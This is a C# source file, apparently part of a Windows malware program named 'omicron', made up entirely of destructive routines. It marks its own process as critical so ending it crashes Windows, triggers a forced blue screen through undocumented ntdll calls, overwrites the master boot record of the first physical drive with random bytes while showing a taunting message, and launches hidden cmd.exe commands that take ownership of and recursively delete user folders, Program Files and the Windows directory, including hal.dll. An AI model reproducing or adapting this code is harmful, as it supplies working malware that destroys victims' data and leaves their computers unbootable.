using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;

namespace omicron
{
    internal class destruction
    {
        #region imports

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        public const uint GENERIC_ALL = 0x10000000;
        public const uint FILE_SHARE_READ = 0x00000001;
        public const uint FILE_SHARE_WRITE = 0x00000002;
        public const uint OPEN_EXISTING = 3;

        [DllImport("kernel32.dll")]
        public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr handle, int procinfoclass, ref int procinfo, int procinfolength);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int RtlAdjustPrivilege(int privilege, bool enable, bool currthread, out bool enabled);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtRaiseHardError(uint errcode, uint parameters, IntPtr unicode, IntPtr parameter, uint responseoption, out uint response);

        public static int critical = 1;
        const int ProcessBreakOnTermination = 0x1D;

        public static Random r = new Random();
        public static IntPtr NULL = IntPtr.Zero;

        #endregion

        public static void SetAsCritical()
        {
            Process self = Process.GetCurrentProcess();
            IntPtr handleself = self.Handle;

            NtSetInformationProcess(handleself, ProcessBreakOnTermination, ref critical, sizeof(int));
        }

        public static void BSoD()
        {
            RtlAdjustPrivilege(19, true, false, out _);
            NtRaiseHardError(0xDEADDEAD, 0, IntPtr.Zero, IntPtr.Zero, 6, out _);
        }

        public static void KillMBR()
        {
            var mbrData = new byte[512];

            r.NextBytes(mbrData);

            IntPtr mbr = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

            if(WriteFile(mbr, mbrData, 512u, out uint lpNumberOfBytesWritten, NULL))
            {
            } else
            {
                MessageBox.Show("MBR overwrite failed!\nthis doesn't mean your pc is still safe tho >:3", "omicron.exe - ERROR",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public static void directoryDeletion()
        {
            // very pro code

            ProcessStartInfo psi;

            #region ownership

            try
            {
                psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c takeown /f \"%SYSTEMROOT%\"*.*",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi);

                psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c takeown /f \"%HOMEPATH%\"*.*",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi);

                psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c takeown /f \"%ALLUSERSPROFILE%\"*.*",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi);

                psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c takeown /f \"%PROGRAMFILES%\"*.*",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi);

                psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c takeown /f \"%PROGRAMFILES(X86)%\"*.*",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi);
            }
            catch { }

            #endregion

            try
            {
                psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c del \"%SYSTEMROOT%\\system32\\hal.dll\" /q",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi);


                psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c del \"%HOMEPATH%\" /s /q",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi);

                psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c del \"%ALLUSERSPROFILE%\" /s /q",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi);

                psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c del \"%PROGRAMFILES%\"/s /q",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi);

                psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c del \"%PROGRAMFILES(X86)%\"/s /q",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi);

                psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c del \"%SYSTEMROOT%\" /s /q",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi);
            } catch { }
        }
    }
}
